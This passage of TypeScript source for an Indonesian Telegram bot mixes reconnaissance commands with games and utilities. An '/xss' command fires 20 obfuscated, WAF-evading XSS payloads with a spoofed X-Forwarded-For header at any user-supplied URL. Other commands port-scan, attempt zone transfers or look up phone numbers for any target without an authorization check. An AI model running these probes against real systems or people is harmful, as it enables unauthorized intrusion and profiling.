                        `✅ <i>Query selesai. ${lines.length > 30 ? '(Dibatasi 30 hasil)' : ''}</i>`;
          ctx.reply(reply, {parse_mode: 'HTML'});
        } else { ctx.reply("❌ Tidak ada domain lain ditemukan di IP ini."); }
      } catch(e: any) { ctx.reply(`❌ Gagal Reverse IP: \n<code>${e.message}</code>`, {parse_mode: 'HTML'}); }
    });

    bot.command('asn', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /asn [IP_atau_AS_Num]");
      let target = args[1];
      try {
        ctx.reply(`🔍 Mencari detail Autonomous System untuk <b>${target}</b>...`, {parse_mode: 'HTML'});
        const res = await fetchWithTimeout(`https://api.hackertarget.com/aslookup/?q=${target}`, {}, 15000);
        const text = await res.text();
        if (text.includes('error') || text.includes('API count exceeded')) throw new Error(text);
        ctx.reply(`<b>🏢 ASN / BGP OSINT</b>\n━━━━━━━━━━━━━━━━━━━━\n<pre>${text}</pre>`, {parse_mode: 'HTML'});
      } catch(e: any) { ctx.reply(`❌ Gagal Lookup ASN: \n<code>${e.message}</code>`, {parse_mode: 'HTML'}); }
    });

    bot.command('zonetransfer', async (ctx) => {
        const args = ctx.message.text.split(' ');
        if(args.length < 2) return ctx.reply("Format: /zonetransfer [Domain]");
        try {
            ctx.reply(`🔍 Mencoba DNS Zone Transfer (AXFR) pada nameserver <b>${args[1]}</b>...`, {parse_mode: 'HTML'});
            const res = await fetchWithTimeout(`https://api.hackertarget.com/zonetransfer/?q=${args[1]}`, {}, 20000);
            const text = await res.text();
            if (text.includes('error') || text.includes('API count exceeded')) throw new Error(text);
            ctx.reply(`<b>🌍 DNS ZONE TRANSFER AUDIT</b>\n━━━━━━━━━━━━━━━━━━━━\n<pre>${text.substring(0, 3500)}</pre>`, {parse_mode: 'HTML'});
        } catch(e: any) { ctx.reply(`❌ Gagal Zone Transfer: \n<code>${e.message}</code>`, {parse_mode: 'HTML'}); }
    });

    bot.command('httpheaders', async (ctx) => {
        const args = ctx.message.text.split(' ');
        if(args.length < 2) return ctx.reply("Format: /httpheaders [Domain/URL]");
        try {
            ctx.reply(`🔍 Menganalisa HTTP Headers & Server Banner <b>${args[1]}</b>...`, {parse_mode: 'HTML'});
            const res = await fetchWithTimeout(`https://api.hackertarget.com/httpheaders/?q=${args[1]}`, {}, 15000);
            const text = await res.text();
            if (text.includes('error') || text.includes('API count exceeded')) throw new Error(text);
            ctx.reply(`<b>🛡️ HTTP HEADERS & WAF</b>\n━━━━━━━━━━━━━━━━━━━━\n<pre>${text.substring(0, 3500)}</pre>`, {parse_mode: 'HTML'});
        } catch(e: any) { ctx.reply(`❌ Gagal mengambil headers: \n<code>${e.message}</code>`, {parse_mode: 'HTML'}); }
    });

    bot.command('traceroute', async (ctx) => {
        const args = ctx.message.text.split(' ');
        if(args.length < 2) return ctx.reply("Format: /traceroute [IP/Domain]");
        try {
            ctx.reply(`🗺️ Melakukan MTR Traceroute ke <b>${args[1]}</b> (Membutuhkan 10-20 Detik)...`, {parse_mode: 'HTML'});
            const res = await fetchWithTimeout(`https://api.hackertarget.com/mtr/?q=${args[1]}`, {}, 30000);
            const text = await res.text();
            if (text.includes('error') || text.includes('API count exceeded')) throw new Error(text);
            ctx.reply(`<b>🛣️ TRACEROUTE & HOP GEO-IP</b>\n━━━━━━━━━━━━━━━━━━━━\n<pre>${text.substring(0, 3500)}</pre>`, {parse_mode: 'HTML'});
        } catch(e: any) { ctx.reply(`❌ Gagal Traceroute: \n<code>${e.message}</code>`, {parse_mode: 'HTML'}); }
    });

    bot.command('github_user', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /github_user [username]");
      try {
        const res = await fetch(`https://api.github.com/users/${args[1]}`);
        if(res.status !== 200) return ctx.reply("❌ User tidak ditemukan.");
        const d = await res.json();
        const reply = `<b>🐙 GITHUB OSINT ANALYTICS</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `👤 <b>USER:</b> <code>${d.login}</code>\n\n` +
                      `├ <b>Name:</b> ${d.name || '-'}\n` +
                      `├ <b>Bio:</b> ${d.bio || '-'}\n` +
                      `├ <b>Location:</b> ${d.location || '-'}\n` +
                      `├ <b>Company:</b> ${d.company || '-'}\n` +
                      `├ <b>Repos:</b> ${d.public_repos} (Public)\n` +
                      `├ <b>Followers:</b> ${d.followers}\n` +
                      `├ <b>Created:</b> ${new Date(d.created_at).toISOString().split('T')[0]}\n` +
                      `└ <b>Link:</b> <a href="${d.html_url}">Visit Profile</a>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `✅ <i>Metadata extraction complete.</i>`;
        ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
      } catch(e) { ctx.reply("❌ Error fetching GitHub data."); }
    });

    bot.command('port', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /port [ip]");
      const ip = args[1];
      const commonPorts = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 8080];
      
      const msg = await ctx.reply(`<i>🔄 Menjalankan Port Scanner (Top 10 TCP) pada <b>${ip}</b>...</i>`, {parse_mode: 'HTML'});
      
      let results: string[] = [];
      let scanned = 0;
      
      const checkPort = (port: number) => {
        return new Promise<void>((resolve) => {
          const socket = new net.Socket();
          socket.setTimeout(2000);
          socket.on('connect', () => { results.push(`├ PORT ${port}: ✅ OPEN`); socket.destroy(); resolve(); });
          socket.on('timeout', () => { results.push(`├ PORT ${port}: ❌ CLOSED/FILTERED`); socket.destroy(); resolve(); });
          socket.on('error', () => { results.push(`├ PORT ${port}: ❌ CLOSED`); socket.destroy(); resolve(); });
          socket.connect(port, ip);
        });
      };

      for (let port of commonPorts) {
        await checkPort(port);
      }

      const reply = `<b>🔌 BASIC TCP PORT SCAN</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>TARGET:</b> <code>${ip}</code>\n\n` +
                    `${results.join('\n')}\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, reply, { parse_mode: 'HTML' });
    });

    bot.command('phone_dork', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /phone_dork [nomor_hp]");
      const numInfo = args.replace(/\D/g, '');
      const numID = numInfo.startsWith('0') ? '62' + numInfo.substring(1) : numInfo;
      const reply = `<b>📱 PHONE TRACKING DORKS</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>TARGET:</b> <code>${args}</code>\n\n` +
                    `├ 📦 <b>Truecaller:</b> <a href="https://www.truecaller.com/search/global/${numID}">Cari Identitas</a>\n` +
                    `├ 💬 <b>WhatsApp:</b> <a href="https://wa.me/${numID}">Check Profile</a>\n` +
                    `└ 🔍 <b>Google:</b> <a href="https://www.google.com/search?q=%22${args}%22+OR+%22${numID}%22">Cari Jejak Digital</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `⚠️ <i>Tips: Gunakan aplikasi GetContact (Apps) untuk hasil nama tag terbaik.</i>`;
      ctx.reply(reply, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('qr', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /qr [text/url]");
      ctx.replyWithPhoto(`https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(args)}`);
    });

    bot.command('shortlink', async (ctx) => {
      const args = ctx.message.text.split(' ')[1];
      if(!args) return ctx.reply("Format: /shortlink [url]");
      let url = args; if(!url.startsWith('http')) url = 'https://' + url;
      try {
        const res = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(url)}`);
        const data = await res.json();
        const reply = `<b>🔗 URL SHORTENING (is.gd)</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `📋 <b>ORIGINAL:</b> <code>${url}</code>\n` +
                      `✨ <b>RESULT:</b> <code>${data.shorturl || "Error"}</code>\n` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(reply, { parse_mode: 'HTML' });
      } catch(e) { ctx.reply("❌ Error shortening link."); }
    });

    bot.command('xss', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) {
        return ctx.reply("❌ Format salah! Gunakan: /xss [URL]\nContoh: /xss https://example.com/search?q=");
      }
      
      let targetUrl = args[1];
      if (!targetUrl.startsWith('http')) {
         targetUrl = 'http://' + targetUrl;
      }
    
      const msgInfo = await ctx.reply(`🔍 <b>XSS VULNERABILITY SCANNER (STEALTH & WAF BYPASS)</b>\n━━━━━━━━━━━━━━━━━━━━\n🎯 <b>Target:</b> <code>${targetUrl}</code>\n🕵️‍♂️ <i>Spoofing User-Agents & Bypassing WAFs...</i>\n⏳ <i>Memulai fuzzing dengan 20 advanced payloads... Mohon tunggu (~10-20 detik).</i>`, {parse_mode: 'HTML'});
      
      // Advance Stealth Payloads for WAF Bypass
      const payloads = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=confirm(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
        "\"<svg/onload=alert(1)//",
        "<img/src=x/onerror=al\\u0065rt(1)>",
        "<a href=\"j%0A%0Davascript:alert(1)\">Click</a>",
        "<math><x href=\"javascript:alert(1)\">click</x></math>",
        "\"<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<<script>alert(1);//<</script>",
        "\"><script src=data:&comma;alert(1)//",
        "<form><button formaction=\"javascript:alert(1)\">X</button></form>",
        "<style>@import'javascript:alert(1)';</style>",
        "<body onpageshow=alert(1)>",
        "\"><script>alert(String.fromCharCode(49))</script>",
        "<a href=\"javas%09cript:alert(1)\">Click</a>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>",
        "<details/open/ontoggle=\"alert(1)\">",
        "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
        "\"><a href=\"javascript&colon;alert(1)\">Click</a>",
        "'-alert(1)-'",
        "\" autofocus onfocus=alert(1)//",
        "<object data=\"javascript:alert(1)\">"
      ];
      
      const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
      ];
    
      let vulnFound = 0;
      let results = "";
      
      try {
          const promises = payloads.map(async (p, idx) => {
              try {
                 const testUrl = targetUrl + encodeURIComponent(p);
                 const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
                 const response = await axios.get(testUrl, { 
                     timeout: 6000, 
                     validateStatus: () => true,
                     headers: {
                        'User-Agent': ua,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1',
                        'X-Forwarded-For': '127.0.0.1', // WAF Bypass spoof IP
                        'Cache-Control': 'max-age=0'
                     }
                 });
                 const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
                 
                 // Smart validation for reflection
                 if (body && body.includes(p)) {
                    vulnFound++;
                    results += `[${idx+1}] 🛑 <b>Payload Reflected!</b>\n🪲 <code>${p.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;')}</code>\n`;
                 }
              } catch (err) {
                 // Ignore errors
              }
          });
          
          await Promise.all(promises);
      } catch (e) {
          // Fallback if request totally fails
      }
    
      let finalMsg = `🔍 <b>ADVANCED XSS SCAN REPORT</b>\n━━━━━━━━━━━━━━━━━━━━\n🎯 <b>Target:</b> <code>${targetUrl}</code>\n`;
      finalMsg += `🧪 <b>Payloads Tested:</b> 20 (WAF Evasion)\n⚠️ <b>Vulnerabilities Found:</b> ${vulnFound}\n\n`;
      
      if (vulnFound > 0) {
         finalMsg += `<b>🚨 Reflected Payloads:</b>\n${results}\n`;
         finalMsg += `💡 <i>Sistem mendeteksi payload ter-reflect di dalam response body tanpa sanitasi/escaping. Hal ini berpotensi mengeksekusi kode JavaScript arbitrer di browser pengguna.</i>`;
      } else {
         finalMsg += `✅ <b>Target tampaknya AMAN dari XSS Reflection.</b>\n`;
         finalMsg += `🛡️ <i>WAF (Web Application Firewall) atau filter backend memblokir/mensanitasi 20 Payload Advanced.</i>`;
      }
      
      ctx.telegram.editMessageText(ctx.chat.id, msgInfo.message_id, undefined, finalMsg, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }}).catch(()=>{});
    });

    bot.command('pwd', (ctx) => {
      const p = ctx.message.text.split(' ')[1];
      let len = parseInt(p) || 12;
      if(len > 64) len = 64; if(len < 4) len = 4;
      const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+~`|}{[]:;?><,./-=";
      let retVal = "";
      for (let i = 0; i < len; ++i) { retVal += charset.charAt(Math.floor(Math.random() * charset.length)); }
      const reply = `<b>🔑 SECURE PASSWORD GEN</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `📏 <b>Length:</b> ${len} chars\n` +
                    `✨ <b>Result:</b> <code>${retVal}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('b64enc', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /b64enc [text]");
      const result = Buffer.from(args).toString('base64');
      const reply = `<b>🔤 BASE64 ENCODER</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<code>${result}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('b64dec', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /b64dec [text]");
      try { 
        const result = Buffer.from(args, 'base64').toString('utf8');
        const reply = `<b>🔤 BASE64 DECODER</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `<code>${result}</code>\n` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(reply, {parse_mode: 'HTML'}); 
      } catch { ctx.reply("❌ Invalid base64"); }
    });

    bot.command('hash', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /hash [text]");
      const md5 = crypto.createHash('md5').update(args).digest('hex');
      const sha256 = crypto.createHash('sha256').update(args).digest('hex');
      const reply = `<b>🔐 MULTI-HASH GENERATOR</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>TEXT:</b> <code>${args}</code>\n\n` +
                    `├ <b>MD5:</b>\n└ <code>${md5}</code>\n\n` +
                    `├ <b>SHA256:</b>\n└ <code>${sha256}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('sha256', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /sha256 [text]");
      ctx.reply(`🔐 SHA256:\n<code>${crypto.createHash('sha256').update(args).digest('hex')}</code>`, {parse_mode: 'HTML'});
    });

    bot.command('uuid', (ctx) => {
      const reply = `<b>🆔 UUID GEN (v4)</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<code>${crypto.randomUUID()}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('flip', (ctx) => {
      ctx.reply(`🪙 Hasil lempar koin: <b>${Math.random() > 0.5 ? 'Kepala (Heads)' : 'Ekor (Tails)'}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('roll', (ctx) => {
      const num = Math.floor(Math.random() * 6) + 1;
      ctx.reply(`🎲 Hasil dadu: <b>${num}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('weather', async (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join('');
      if(!args) return ctx.reply("Format: /weather [kota]");
      try {
        const res = await fetch(`https://wttr.in/${encodeURIComponent(args)}?format=3`);
        const text = await res.text();
        const reply = `<b>⛅ WEATHER FORECAST</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `<pre>${text}</pre>` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(reply, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Gagal mendapat info cuaca."); }
    });

    bot.command('crypto_price', async (ctx) => {
       const args = ctx.message.text.split(' ')[1] || 'bitcoin';
       try {
         const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${args.toLowerCase()}&vs_currencies=usd,idr`);
         const data = await res.json();
         if(data[args.toLowerCase()]) {
            const reply = `<b>🪙 MARKET PRICE: ${args.toUpperCase()}</b>\n` +
                          `━━━━━━━━━━━━━━━━━━━━\n` +
                          `├ 💵 <b>USD:</b> $${data[args.toLowerCase()].usd}\n` +
                          `└ 🇮🇩 <b>IDR:</b> Rp${data[args.toLowerCase()].idr.toLocaleString('id-ID')}\n` +
                          `━━━━━━━━━━━━━━━━━━━━`;
            ctx.reply(reply, {parse_mode: 'HTML'});
         } else { ctx.reply("❌ Koin tidak ditemukan."); }
       } catch { ctx.reply("❌ Error fetch market."); }
    });

    bot.command('meme', async (ctx) => {
      try {
        const res = await fetch('https://meme-api.com/gimme');
        const data = await res.json();
        ctx.replyWithPhoto(data.url, { caption: data.title });
      } catch { ctx.reply("❌ Error get meme."); }
    });

    bot.command('joke', async (ctx) => {
      try {
        const res = await fetch('https://official-joke-api.appspot.com/random_joke');
        const data = await res.json();
        ctx.reply(`🤣 <b>${data.setup}</b>\n\n<i>${data.punchline}</i>`, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Error get joke."); }
    });

    bot.command('quote', async (ctx) => {
      try {
        const res = await fetch('https://dummyjson.com/quotes/random');
        const data = await res.json();
        ctx.reply(`💭 <i>"${data.quote}"</i>\n- <b>${data.author}</b>`, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Error get quote."); }
    });

    bot.command('fact', async (ctx) => {
      try {
        const res = await fetch('https://uselessfacts.jsph.pl/random.json?language=en');
        const data = await res.json();
        ctx.reply(`🧠 <b>Faktanya:</b>\n${data.text}`, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Error get fact."); }
    });

    bot.command('cat', async (ctx) => {
      try {
        const res = await fetch('https://api.thecatapi.com/v1/images/search');
        const data = await res.json();
        ctx.replyWithPhoto(data[0].url);
      } catch { ctx.reply("❌ Error get cat."); }
    });

    bot.command('dog', async (ctx) => {
      try {
        const res = await fetch('https://dog.ceo/api/breeds/image/random');
        const data = await res.json();
        ctx.replyWithPhoto(data.message);
      } catch { ctx.reply("❌ Error get dog."); }
    });

    const downloadSong = async (ctx: any) => {
      return ctx.reply("🚧 <b>Fitur musik (/play & /lagu) sedang dalam pemeliharaan (maintenance). Mohon tunggu kabar selanjutnya.</b>", { parse_mode: 'HTML' });
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if (!args) return ctx.reply("🎵 Gunakan format: /lagu [judul] atau /play [judul]");
      
      const waitMsg = await ctx.reply("⏳ <i>Mencari lagu di database (YouTube)...</i>", { parse_mode: 'HTML' });
      try {
        const results = await yts(args);
        
        if (!results || results.videos.length === 0) {
           return ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, undefined, "❌ ʟᴀɢᴜ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ.");
        }
        
        const video = results.videos[0];
        
        await ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, undefined, `⏳ <i>ᴍᴇɴɢᴜɴᴅᴜʜ ᴀᴜᴅɪᴏ: ${video.title}...\n(ᴘʀᴏꜱᴇꜱ ʙʏᴘᴀꜱꜱ ᴋᴇᴄᴇᴘᴀᴛᴀɴ ᴛɪɴɢɢɪ ꜱᴇᴅᴀɴɢ ʙᴇʀᴊᴀʟᴀɴ...)</i>`, { parse_mode: 'HTML' });
        
        try {
          play.setToken({ useragent: ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"] });
          const info = await ytdl.getInfo(video.url, {
            requestOptions: {
              headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
              }
            }
          });
          const stream = ytdl.downloadFromInfo(info, { filter: 'audioonly', quality: 'highestaudio' });
          
          await ctx.replyWithAudio(
            { source: stream, filename: video.title + '.mp3' },
            { caption: `🎵 <b>${video.title}</b>\n👤 <b>Author:</b> ${video.author.name}\n☁️ <b>Source:</b> YouTube`, parse_mode: 'HTML' }
          );
          
          ctx.telegram.deleteMessage(ctx.chat.id, waitMsg.message_id).catch(() => {});
        } catch (downloadErr: any) {
          throw new Error("Gagal mengambil stream audio via play-dl: " + downloadErr?.message);
        }
      } catch (err: any) {
        console.error("Lagu err:", err);
        ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, undefined, `❌ Gagal mengunduh lagu: ${err?.message || 'Error internal'}`);
      }
    };

    bot.command('lagu', downloadSong);
    bot.command('play', downloadSong);

    bot.command('hentai', (ctx) => {
      ctx.reply("🔞 <b>ʜᴇɴᴛᴀɪ ᴍᴏᴅᴜʟᴇ (ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ)</b>\n━━━━━━━━━━━━━━━━━━━━\n\nꜱᴏʀʀʏ, ꜰɪᴛᴜʀ ᴜɴᴅᴜʜ ᴠɪᴅᴇᴏ ꜱᴇᴅᴀɴɢ ᴅɪᴘᴇʀʙᴀɪᴋɪ.\nᴄᴏʙᴀ ʟᴀɢɪ ɴᴀɴᴛɪ ᴘᴀᴅᴀ ᴜᴘᴅᴀᴛᴇ ʙᴇʀɪᴋᴜᴛɴʏᴀ.", { parse_mode: 'HTML' });
    });

    // --- 20+ MINI GAMES ---
    bot.command('suit', (ctx) => {
      const choices = ['batu', 'gunting', 'kertas'];
      const args = ctx.message.text.split(' ')[1]?.toLowerCase();
      if (!args || !choices.includes(args)) return ctx.reply("Format: /suit [batu/gunting/kertas]");
      const botChoice = choices[Math.floor(Math.random() * choices.length)];
      let result = 'KITA SERI! 😑';
      if (
        (args === 'batu' && botChoice === 'gunting') ||
        (args === 'gunting' && botChoice === 'kertas') ||
        (args === 'kertas' && botChoice === 'batu')
      ) { result = 'KAMU MENANG! 🎉'; }
      else if (args !== botChoice) { result = 'KAMU KALAH! 🤡'; }
      ctx.reply(`Kamu: ${args.toUpperCase()}\nBot: ${botChoice.toUpperCase()}\n\n${result}`);
    });

    bot.command('math', (ctx) => {
      const ops = ['+', '-', '*'];
      const op = ops[Math.floor(Math.random() * ops.length)];
      const a = Math.floor(Math.random() * 50) + 1;
      const b = Math.floor(Math.random() * 20) + 1;
      const ans = op === '+' ? a+b : op === '-' ? a-b : a*b;
      ctx.reply(`🧮 <b>QUICK MATHS</b>\nBerapa hasil dari: <b>${a} ${op} ${b} = ?</b>\n\n<tg-spoiler>Jawaban: ${ans}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('dadu', (ctx) => {
      const num = Math.floor(Math.random() * 6) + 1;
      ctx.reply(`🎲 Kamu melempar dadu dan mendapat angka: <b>${num}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('coinflip', (ctx) => {
      const res = Math.random() > 0.5 ? 'HEADS (Angka)' : 'TAILS (Gambar)';
      ctx.reply(`🪙 Koin dilempar dan hasilnya: <b>${res}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('susunkata', (ctx) => {
      const words = ['hacker', 'phishing', 'malware', 'firewall', 'server', 'database', 'payload', 'system', 'network', 'cyber'];
      const word = words[Math.floor(Math.random() * words.length)];
      const scrambled = word.split('').sort(() => 0.5 - Math.random()).join('');
      ctx.reply(`🔡 <b>SUSUN KATA</b>\nCoba susun huruf ini menjadi istilah IT:\n<b>${scrambled.toUpperCase()}</b>\n\n<tg-spoiler>Jawaban: ${word.toUpperCase()}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('tebakangka', (ctx) => {
      const a = Math.floor(Math.random() * 10) + 1;
      ctx.reply(`🔢 <b>TEBAK ANGKA</b>\nAku sudah memilih angka dari 1 - 10.\n\n<tg-spoiler>Angka itu adalah: ${a}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('khodam', (ctx) => {
      const nama = ctx.message.text.split(' ').slice(1).join(' ') || 'Kamu';
      const k = ['Macan Putih', 'Naga Sakti', 'Kuntilanak Merah', 'Kucing Oren', 'Tuyul Racing', 'Siluman Ular', 'Bebek Ngesot', 'Kosong (Tidak Ada)', 'Kulkas 2 Pintu', 'Spion Motor'];
      const res = k[Math.floor(Math.random() * k.length)];
      ctx.reply(`👻 <b>CEK KHODAM</b>\nNama: ${nama}\nKhodam kamu: <b>${res}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('ramal', (ctx) => {
      const nama = ctx.message.text.split(' ').slice(1).join(' ') || 'Kamu';
      const r = ['Akan kaya raya tahun depan!', 'Akan menemukan jodoh secepatnya!', 'Akan kesandung batu besok', 'Harus lebih banyak minum air putih', 'Sedang dirindukan seseorang', 'Akan mendapat rezeki nomplok', 'Akan menangis bahagia hari ini'];
      const res = r[Math.floor(Math.random() * r.length)];
      ctx.reply(`🔮 <b>RAMALAN HARI INI</b>\nNama: ${nama}\nRamalan: <i>${res}</i>`, {parse_mode: 'HTML'});
    });

    bot.command('jodoh', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 3) return ctx.reply("Format: /jodoh [Nama1] [Nama2]");
      const pct = Math.floor(Math.random() * 101);
      ctx.reply(`💘 <b>KALKULATOR JODOH</b>\n${args[1]} 💞 ${args[2]}\n\nTingkat Kecocokan: <b>${pct}%</b>\n${pct > 80 ? 'Wow! Kalian sangat serasi!' : pct > 40 ? 'Hmm, boleh juga.' : 'Sebaiknya cari yang lain...'}`, {parse_mode: 'HTML'});
    });

    bot.command('kartu', (ctx) => {
      const suits = ['♠️ Terop', '♥️ Hati', '♣️ Keriting', '♦️ Wajik'];
      const values = ['As', '2', '3', '4', '5', '6', '7', '8', '9', '10', 'Jack', 'Queen', 'King'];
      const a = suits[Math.floor(Math.random() * suits.length)];
      const b = values[Math.floor(Math.random() * values.length)];
      ctx.reply(`🃏 Kamu menarik kartu: <b>${b} ${a}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('roulette', (ctx) => {
      const bullet = Math.floor(Math.random() * 6);
      if (bullet === 0) return ctx.reply("🔫 💥 DORRR!!! Kamu tertembak (Russian Roulette)!");
      ctx.reply("🔫 <i>Click...</i> Selamat, peluru kosong. Kamu selamat.", {parse_mode: 'HTML'});
    });

    bot.command('werewolf', (ctx) => {
      const roles = [
        { r: '🐺 Werewolf', d: 'Tujuanmu: Habisi villager tanpa ketahuan. Berbohonglah dengan baik.' },
        { r: '🧙‍♀️ Seer', d: 'Tujuanmu: Terawang 1 orang setiap malam untuk mencari Werewolf.' },
        { r: '🛡️ Bodyguard', d: 'Tujuanmu: Lindungi 1 orang setiap malam dari gigitan Werewolf.' },
        { r: '🧑‍🌾 Villager', d: 'Tujuanmu: Cari tahu siapa Werewolf di siang hari dan gantung mereka.' },
        { r: '🃏 Fool', d: 'Tujuanmu: Bertingkah mencurigakan agar digantung oleh Villager (kamu menang jika digantung).' },
        { r: '🏹 Hunter', d: 'Tujuanmu: Jika kamu mati, kamu bisa membawa seseorang ikut mati bersamamu.' }
      ];
      const r = roles[Math.floor(Math.random() * roles.length)];
      
      const simulasi = [
        "Desa sedang tegang. Seorang penduduk ditemukan tewas tercabik-cabik.",
        "Malam sangat hening, tidak ada lolongan.",
        "Warga desa mulai saling curiga di balai desa.",
        "Seseorang tertangkap basah keluar rumah saat tengah malam."
      ];
      const sim = simulasi[Math.floor(Math.random() * simulasi.length)];

      const msg = `🌕 <b>WEREWOLF ROLE SIMULATION</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `Kamu terbangun di desa misterius...\n\n` +
                  `🎭 <b>ROLE KAMU:</b> ${r.r}\n` +
                  `📜 <b>MISI:</b> <i>${r.d}</i>\n\n` +
                  `🌑 <b>SITUASI DESA:</b>\n` +
                  `<i>"${sim}"</i>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n`;
      ctx.reply(msg, {parse_mode: 'HTML'});
    });

    bot.command('8ball', (ctx) => {
      const q = ctx.message.text.split(' ').slice(1).join(' ');
      if(!q) return ctx.reply("Format: /8ball [pertanyaan]");
      const answers = [
        { type: '🟢 Positif', text: ['Sangat mungkin terjadi.', 'Tentu saja.', 'Alam semesta mendukungmu.'] },
